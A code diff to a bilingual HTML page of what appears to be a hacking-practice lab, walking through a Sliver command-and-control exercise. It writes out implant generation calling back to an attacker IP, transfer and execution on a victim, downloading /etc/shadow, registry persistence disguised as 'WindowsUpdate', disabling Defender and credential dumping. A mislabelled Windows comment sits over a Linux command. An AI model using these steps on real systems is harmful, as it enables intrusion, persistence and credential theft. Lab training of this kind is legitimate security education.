@@ -6,7 +6,24 @@
 
   <div class="hl-card mb-4">
     <h2 class="text-sm font-semibold" style="color:var(--hl-primary)">C2 – Sliver (Command & Control)</h2>
-    <p class="text-sm text-gray-600 dark:text-gray-400 mt-3 mb-3">En este laboratorio practicarás técnicas básicas de Command & Control con <strong>Sliver</strong>. Primero conéctate por SSH a la máquina objetivo con alguno de los usuarios (por ejemplo <code>admin</code> / <code>password1</code>, o <code>alice</code>, <code>bob</code>) similar al lab de <a href="/bruteforce">Bruteforce</a>. Después instala y levanta un servidor Sliver en tu Kali, genera un implant (implant/payload), y ejecuta ese implant en la máquina víctima para obtener una sesión C2.</p>
+    <div class="lab-description">
+      <div class="lang-content" data-lang="es">
+        <p class="text-sm text-gray-600 dark:text-gray-400 mt-3 mb-3">
+          En este laboratorio practicarás técnicas básicas de Command & Control con <strong>Sliver</strong>.<br>
+          1. Conéctate por SSH a la máquina objetivo con alguno de los usuarios (por ejemplo <code>admin</code> / <code>password1</code>, o <code>alice</code>, <code>bob</code>) similar al lab de <a href="/bruteforce">Bruteforce</a>.<br>
+          2. <b>Instala y levanta un servidor Sliver en tu Kali</b> siguiendo la <a href="https://afsh4ck.gitbook.io/ethical-hacking-cheatsheet/post-explotacion/post-explotacion/command-and-control-c2/sliver" target="_blank" rel="noopener">guía completa aquí</a>.<br>
+          3. Genera un implant (payload), transfiérelo y ejecútalo en la máquina víctima para obtener una sesión C2.
+        </p>
+      </div>
+      <div class="lang-content" data-lang="en" style="display:none">
+        <p class="text-sm text-gray-600 dark:text-gray-400 mt-3 mb-3">
+          In this lab you will practice basic Command & Control techniques with <strong>Sliver</strong>.<br>
+          1. Connect via SSH to the target machine using one of the users (e.g. <code>admin</code> / <code>password1</code>, or <code>alice</code>, <code>bob</code>) similar to the <a href="/bruteforce">Bruteforce</a> lab.<br>
+          2. <b>Install and start a Sliver server on your Kali</b> following the <a href="https://afsh4ck.gitbook.io/ethical-hacking-cheatsheet/post-explotacion/post-explotacion/command-and-control-c2/sliver" target="_blank" rel="noopener">full guide here</a>.<br>
+          3. Generate an implant (payload), transfer and execute it on the victim machine to get a C2 session.
+        </p>
+      </div>
+    </div>
 
     <div class="mt-4 hl-code text-xs">
       <div class="text-gray-400"># Conexión SSH al objetivo (ejemplo)</div>
@@ -40,13 +57,11 @@
       </li>
       <li><strong>Generar un implant</strong> (reemplaza con la IP de tu máquina atacante — en este lab se autocompleta con la IP del cliente):
         <pre><code class="language-bash"># Windows (amd64)
-sliver > generate --mtls {{ client_ip }}:443 --os windows --arch amd64
-
-# Linux (amd64)
-sliver > generate --mtls {{ client_ip }}:443 --os linux --arch amd64
-
-# macOS (arm64)
-sliver > generate --mtls {{ client_ip }}:443 --os mac --arch arm64</code></pre>
+          sliver > generate --mtls {{ client_ip }}:443 --os linux --arch amd64
+          # Windows (amd64)
+          sliver > generate --mtls {{ client_ip }}:443 --os windows --arch amd64
+          # macOS (arm64)
+          sliver > generate --mtls {{ client_ip }}:443 --os mac --arch arm64</code></pre>
       </li>
       <li><strong>Levantar un listener mTLS</strong> en Sliver:
         <pre><code class="language-bash">sliver > mtls --lport 443
@@ -54,10 +69,12 @@ sliver > jobs        # verifica que el job esté activo</code></pre>
       </li>
       <li><strong>Transferir el implant</strong> a la víctima y ejecutarlo (ejemplos):
         <pre><code class="language-bash"># Desde Kali: scp/powershell/curl según plataforma
-      scp /home/kali/IMPLANT_NAME admin@{{ target_ip }}:/tmp/
-      # En la víctima Windows (PowerShell):
-      .\IMPLANT_NAME.exe
-      # En Linux/Mac: subir binario y ejecutar: ./IMPLANT_NAME</code></pre>
+        scp /home/kali/IMPLANT_NAME admin@10.9.13.63:/tmp/
+        # En la víctima Linux/Mac:
+        chmod +x /tmp/IMPLANT_NAME
+        /tmp/IMPLANT_NAME
+        # En la víctima Windows (PowerShell):
+        .\IMPLANT_NAME.exe</code></pre>
       </li>
       <li><strong>Comprobar sesiones</strong> desde Sliver y usarla:
         <pre><code class="language-bash">sliver > sessions
@@ -122,7 +139,95 @@ sliver > use <ID>
   </div>
   
   <div class="lang-content" data-lang="en" style="display:none">
-    <p>English summary available in future updates.</p>
+    <h3>Quick summary — Sliver C2 lab steps</h3>
+    <ol>
+      <li><strong>Install Sliver</strong> on Kali (client + server):
+        <pre><code class="language-bash">curl -sSL https://sliver.sh/install | sudo bash</code></pre>
+      </li>
+      <li><strong>Start Sliver</strong> (open the interactive CLI):
+        <pre><code class="language-bash">sliver
+# On first run it will generate certificates and open the prompt</code></pre>
+      </li>
+      <li><strong>Generate an implant</strong> (replace with your attacker's IP — in this lab it is auto-filled with your client IP):
+        <pre><code class="language-bash"># Windows (amd64)
+          sliver > generate --mtls {{ client_ip }}:443 --os linux --arch amd64
+          # Windows (amd64)
+          sliver > generate --mtls {{ client_ip }}:443 --os windows --arch amd64
+          # macOS (arm64)
+          sliver > generate --mtls {{ client_ip }}:443 --os mac --arch arm64</code></pre>
+      </li>
+      <li><strong>Start an mTLS listener</strong> in Sliver:
+        <pre><code class="language-bash">sliver > mtls --lport 443
+sliver > jobs        # check that the job is active</code></pre>
+      </li>
+      <li><strong>Transfer the implant</strong> to the victim and execute it (examples):
+        <pre><code class="language-bash"># From Kali: scp/powershell/curl depending on platform
+        scp /home/kali/IMPLANT_NAME admin@10.9.13.63:/tmp/
+        # On victim Linux/Mac:
+        chmod +x /tmp/IMPLANT_NAME
+        /tmp/IMPLANT_NAME
+        # On victim Windows (PowerShell):
+        .\IMPLANT_NAME.exe</code></pre>
+      </li>
+      <li><strong>Check sessions</strong> from Sliver and use it:
+        <pre><code class="language-bash">sliver > sessions
+sliver > use <SESSION_ID>
+sliver (SESSION) > help</code></pre>
+      </li>
+      <li><strong>Post-exploitation actions</strong> (examples):
+        <ul>
+          <li>List processes: <code>ps -aux</code></li>
+          <li>Session info: <code>info</code> (hostname, user, uid, active C2)</li>
+          <li>Check identity and privileges: <code>execute -o id</code>, <code>execute -o whoami</code></li>
+          <li>Try privilege escalation: <code>execute -o sudo -l</code> (if applicable)</li>
+          <li>Download important files: <code>download /etc/shadow /home/kali/shadow</code> (requires privileges)</li>
+          <li>Run remote commands: <code>execute -o uname -a</code></li>
+        </ul>
+      </li>
+      <li><strong>Basic persistence</strong> (Windows example):
+        <pre><code class="language-bash">sliver (SESSION) > execute -o cmd -Command "reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v WindowsUpdate /t REG_SZ /d \"C:\\Users\\Public\\IMPLANT_NAME.exe\" /f"</code></pre>
+      </li>
+    </ol>
+    <h3>Tips & OPSEC for the lab</h3>
+    <ul>
+      <li>Sliver implants are large (~15MB) and use mTLS encryption by default.</li>
+      <li>If Defender detects the binary on Windows, disable it only in a controlled lab environment.</li>
+      <li>Practice process migration, memory dumps (<code>procdump</code>), and extraction with <code>pypykatz</code> on your Kali to view credentials.</li>
+    </ul>
+    <h3>Useful commands (summary)</h3>
+    <pre><code class="language-bash"># Install
+curl -sSL https://sliver.sh/install | sudo bash
+
+# Start sliver
+sliver
+
+# Generate implant
+sliver > generate --mtls {{ client_ip }}:443 --os windows --arch amd64
+
+# Start mTLS listener
+sliver > mtls --lport 443
+
+# List sessions
+sliver > sessions
+
+# Use a session
+sliver > use <ID>
+
+# Post-exploitation
+      sliver (ID) > ps
+      sliver (ID) > info
+      sliver (ID) > execute -o id
+      sliver (ID) > execute -o uname -a
+      sliver (ID) > execute -o sudo -l
+      sliver (ID) > download /etc/shadow /home/kali/shadow</code></pre>
+
+    <h3>References</h3>
+    <ul>
+      <li><a href="https://github.com/BishopFox/sliver" target="_blank" rel="noopener">GitHub - BishopFox/sliver</a></li>
+      <li>See <code>help</code> inside the <code>sliver</code> client for more commands and <code>armory</code> for extensions.</li>
+      <li><a href="https://afsh4ck.gitbook.io/ethical-hacking-cheatsheet/post-explotacion/post-explotacion/command-and-control-c2/sliver" target="_blank" rel="noopener">Full guide (GitBook) — Sliver C2 (Post-exploitation / Persistence)</a></li>
+    </ul>
+  </div>
   </div>
 </div>
 
